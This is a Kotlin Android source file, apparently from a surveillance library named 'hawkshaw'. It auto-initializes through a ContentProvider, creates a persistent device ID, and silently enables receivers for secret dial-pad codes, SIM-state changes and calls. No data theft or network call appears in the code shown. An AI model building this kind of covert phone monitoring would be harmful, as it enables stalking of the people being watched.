package com.hawkshaw.library

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log // Import Log class for debug logs
import androidx.core.app.NotificationCompat
import androidx.lifecycle.DefaultLifecycleObserver
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import androidx.lifecycle.ProcessLifecycleOwner
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.preferences.Prefs // <--- Import Prefs
import com.hawkshaw.library.receivers.CallReceiver
import com.hawkshaw.library.receivers.SecretDialPadCodeReceiver
import com.hawkshaw.library.receivers.SimStateReceiver
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.UUID
import kotlin.properties.Delegates

class App : ContentProviderWrapper(), LifecycleEventObserver, DefaultLifecycleObserver, LifecycleOwner {

    companion object {
        private const val TAG = "App"

        private lateinit var appContext: Context
        // Keep 'instance' as lateinit var. Kotlin will generate an implicit setter for it.
        internal lateinit var instance: App

        fun getContext(): Context {
            Log.d(TAG, "getContext() called. appContext initialized: ${::appContext.isInitialized}") // Debug log
            if (!::appContext.isInitialized) {
                // This throw should ideally not be reached if App is correctly declared in manifest
                Log.e(TAG, "App context has not been initialized. Throwing IllegalStateException.") // Error log
                throw IllegalStateException("App context has not been initialized.")
            }
            return appContext
        }

        // REMOVED THE EXPLICIT setInstance FUNCTION.
        // Direct assignment to 'instance' property will use the implicit setter.
        // internal fun setInstance(app: App) {
        //     instance = app
        // }
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle
        get() = lifecycleRegistry

    init {
        Log.d(TAG, "App init block called. Adding ProcessLifecycleOwner observer.") // Debug log
        ProcessLifecycleOwner.get().lifecycle.addObserver(this)
    }

    override fun onCreate(): Boolean {
        Log.d(TAG, "onCreate() called.") // Debug log
        val providerContext = context ?: run {
            Log.e(TAG, "ContentProvider context not available. Throwing IllegalStateException.") // Error log
            throw IllegalStateException("ContentProvider context not available")
        }

        appContext = providerContext.applicationContext
        instance = this // Directly assign to the 'instance' property.
        Log.d(TAG, "App context and instance initialized in onCreate().") // Debug log

        // THIS IS THE CRUCIAL LINE: Initialize Prefs here!
        Prefs.init(appContext) // Use the applicationContext for Prefs initialization
        Log.d(TAG, "Prefs initialized with appContext.") // Debug log

        // Generate and store a permanent device ID if it doesn't exist
        if (Prefs.getString("device_id").isNullOrEmpty()) {
            Prefs.putString("device_id", UUID.randomUUID().toString())
            Log.i(TAG, "Generated and stored new permanent device ID.")
        }

        CoroutineScope(Dispatchers.Main).launch {
            Log.d(TAG, "Launching coroutine to enable receivers.") // Debug log
            enableReceivers()
        }

        Log.d(TAG, "onCreate() finished. Returning true.") // Debug log
        return true
    }

    override fun onStateChanged(source: LifecycleOwner, event: Lifecycle.Event) {
        Logger.v(TAG, "LifecycleEvent ${event.name}", false, 4, null)
        Log.v(TAG, "LifecycleEvent (Android Log) ${event.name}") // Android Log.v for lifecycle events
        lifecycleRegistry.currentState = event.targetState
    }

    // This is the SINGLE enableReceivers function
    private fun enableReceivers() {
        Log.d(TAG, "enableReceivers() called.") // Debug log
        val currentAppContext = getContext()

        val receiverClasses = arrayOf(
            SecretDialPadCodeReceiver::class.java,
            SimStateReceiver::class.java,
            CallReceiver::class.java
        )

        Log.d(TAG, "Attempting to enable ${receiverClasses.size} receivers.") // Debug log

        receiverClasses.map { cls ->
            Log.v(TAG, "Creating ComponentName for receiver: ${cls.simpleName}") // Verbose log for each receiver
            // The cast should still be here if the compiler is being overly cautious.
            ComponentName(currentAppContext as Context, cls)
        }.forEach { component ->
            currentAppContext?.packageManager?.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "Enabled component: ${component.className}") // Debug log after enabling each component
        }
        Log.d(TAG, "Finished enabling receivers.") // Debug log
    }
}